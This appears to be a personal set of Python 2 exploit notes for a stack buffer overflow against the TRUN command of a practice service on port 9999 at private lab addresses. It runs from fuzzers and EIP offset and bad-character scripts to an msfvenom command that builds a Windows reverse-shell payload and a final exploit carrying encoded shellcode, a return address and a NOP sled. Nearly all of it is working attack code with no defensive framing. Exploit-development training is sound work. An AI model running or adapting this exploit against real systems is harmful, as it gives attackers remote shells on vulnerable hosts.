FUZZER ONE


#!/usr/bin/python
import socket
# create an array of buffers, while increasing them.
buffer=["A"]
counter = 100
while len(buffer) <= 30: 
     buffer.append("A"*counter)
     counter = counter + 200
for string in buffer: 
     print "Fuzzing PASS with %s bytes" % len(string)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     connect = s.connect(('192.168.240.128',9999))
     s.recv(1024) 
     s.send("TRUN ." + string + '\r\n')
     s.close()



fuzzer two  [OPTIONAL]

#!/usr/bin/python
import socket
server = '192.168.240.128'
sport = 9999
length = int(raw_input('Length of attack: '))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)
print "Sending attack length ", length, ' to TRUN .'
attack = 'A' * length
s.send(('TRUN .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
    
    
EIP FUZZ

#!/usr/bin/python
import socket
# create an array of buffers, while increasing them.
buffer=""
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.114.128',9999))
s.recv(1024) 
s.send("TRUN ." + buffer + '\r\n')
s.close()

EIP FUZZ1

#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A"*2006 + "B"*4 + "C"*74

try: 
     print "\sending evil buffer..." 
     s.connect(('192.168.114.128',9999)) 
     data = s.recv(1024) 
     s.send("TRUN ." + buffer + '\r\n') 
     print "\nDone!"

except: 
     print "Count not connect to Brain!"


Fuzzing Bad chars


#!/usr/bin/python
import socket
server = '192.168.119.129'
sport = 9999

prefix = 'A' * 2006
eip = 'BCDE'
testchars = ''
for i in range(0, 256): /change if you don't want to test with nullcharacter such as /x00 with 1,256 in for loop
	testchars += chr(i)
padding = 'F' * (3000 - 2006 - 4 - len(testchars))
attack = prefix + eip + testchars + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)
print "Sending attack to TRUN . with length ", len(attack)
s.send(('TRUN .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()

Example badchars

"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"


shell code Generate

msfvenom -a x86 –platform Windows -p windows/shell_reverse_tcp LHOST=<attacker’s IP address> LPORT=4444 -e x86/shikata_ga_nai -b ‘\x00’ -f python    
    
Final shellcode exploiter

#!/usr/bin/python
import socket
server = '192.168.114.128'
sport = 9999

prefix = 'A' * 2006
eip = '\xaf\x11\x50\x62'
nopsled = '\x90' * 16
buf =  ""
buf += "\xdb\xd3\xb8\xb4\xbb\x23\x42\xd9\x74\x24\xf4\x5e\x33"
buf += "\xc9\xb1\x52\x83\xee\xfc\x31\x46\x13\x03\xf2\xa8\xc1"
buf += "\xb7\x06\x26\x87\x38\xf6\xb7\xe8\xb1\x13\x86\x28\xa5"
buf += "\x50\xb9\x98\xad\x34\x36\x52\xe3\xac\xcd\x16\x2c\xc3"
buf += "\x66\x9c\x0a\xea\x77\x8d\x6f\x6d\xf4\xcc\xa3\x4d\xc5"
buf += "\x1e\xb6\x8c\x02\x42\x3b\xdc\xdb\x08\xee\xf0\x68\x44"
buf += "\x33\x7b\x22\x48\x33\x98\xf3\x6b\x12\x0f\x8f\x35\xb4"
buf += "\xae\x5c\x4e\xfd\xa8\x81\x6b\xb7\x43\x71\x07\x46\x85"
buf += "\x4b\xe8\xe5\xe8\x63\x1b\xf7\x2d\x43\xc4\x82\x47\xb7"
buf += "\x79\x95\x9c\xc5\xa5\x10\x06\x6d\x2d\x82\xe2\x8f\xe2"
buf += "\x55\x61\x83\x4f\x11\x2d\x80\x4e\xf6\x46\xbc\xdb\xf9"
buf += "\x88\x34\x9f\xdd\x0c\x1c\x7b\x7f\x15\xf8\x2a\x80\x45"
buf += "\xa3\x93\x24\x0e\x4e\xc7\x54\x4d\x07\x24\x55\x6d\xd7"
buf += "\x22\xee\x1e\xe5\xed\x44\x88\x45\x65\x43\x4f\xa9\x5c"
buf += "\x33\xdf\x54\x5f\x44\xf6\x92\x0b\x14\x60\x32\x34\xff"
buf += "\x70\xbb\xe1\x50\x20\x13\x5a\x11\x90\xd3\x0a\xf9\xfa"
buf += "\xdb\x75\x19\x05\x36\x1e\xb0\xfc\xd1\xe1\xed\x8c\xa0"
buf += "\x8a\xef\x70\xa7\x98\x79\x96\xcd\x0c\x2c\x01\x7a\xb4"
buf += "\x75\xd9\x1b\x39\xa0\xa4\x1c\xb1\x47\x59\xd2\x32\x2d"
buf += "\x49\x83\xb2\x78\x33\x02\xcc\x56\x5b\xc8\x5f\x3d\x9b"
buf += "\x87\x43\xea\xcc\xc0\xb2\xe3\x98\xfc\xed\x5d\xbe\xfc"
buf += "\x68\xa5\x7a\xdb\x48\x28\x83\xae\xf5\x0e\x93\x76\xf5"
buf += "\x0a\xc7\x26\xa0\xc4\xb1\x80\x1a\xa7\x6b\x5b\xf0\x61"
buf += "\xfb\x1a\x3a\xb2\x7d\x23\x17\x44\x61\x92\xce\x11\x9e"
buf += "\x1b\x87\x95\xe7\x41\x37\x59\x32\xc2\x47\x10\x1e\x63"
buf += "\xc0\xfd\xcb\x31\x8d\xfd\x26\x75\xa8\x7d\xc2\x06\x4f"
buf += "\x9d\xa7\x03\x0b\x19\x54\x7e\x04\xcc\x5a\x2d\x25\xc5"

padding = 'F' * (2900 - 2006 - 4 - 16 - len(buf))
attack = prefix + eip + nopsled + buf + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)
print "Sending attack to TRUN . with length ", len(attack)
s.send(('TRUN .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
